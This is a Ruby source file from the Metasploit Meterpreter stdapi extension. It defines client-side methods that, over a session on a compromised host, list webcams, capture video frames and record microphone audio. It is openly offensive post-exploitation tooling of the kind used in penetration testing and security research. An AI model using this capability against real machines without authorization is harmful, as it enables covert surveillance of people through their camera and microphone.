# -*- coding: binary -*-

module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Webcam

###
#
# This meterpreter extension can list and capture from webcams and/or microphone
#
###
class Webcam

  def initialize(client)
    @client = client
  end

  def webcam_list
    response = client.send_request(Packet.create_request('webcam_list'))
    names = []
    response.get_tlvs( TLV_TYPE_WEBCAM_NAME ).each{ |tlv|
      names << tlv.value
    }
    names
  end

  # Starts recording video from video source of index +cam+
  def webcam_start(cam)
    request = Packet.create_request('webcam_start')
    request.add_tlv(TLV_TYPE_WEBCAM_INTERFACE_ID, cam)
    client.send_request(request)
    true
  end

  def webcam_get_frame(quality)
    request = Packet.create_request('webcam_get_frame')
    request.add_tlv(TLV_TYPE_WEBCAM_QUALITY, quality)
    response = client.send_request(request)
    response.get_tlv( TLV_TYPE_WEBCAM_IMAGE ).value
  end

  def webcam_stop
    client.send_request( Packet.create_request( 'webcam_stop' )  )
    true
  end

  # Record from default audio source for +duration+ seconds;
  # returns a low-quality wav file
  def record_mic(duration)
    request = Packet.create_request('webcam_audio_record')
    request.add_tlv(TLV_TYPE_AUDIO_DURATION, duration)
    response = client.send_request(request)
    response.get_tlv( TLV_TYPE_AUDIO_DATA ).value
  end

  attr_accessor :client

end

end; end; end; end; end; end
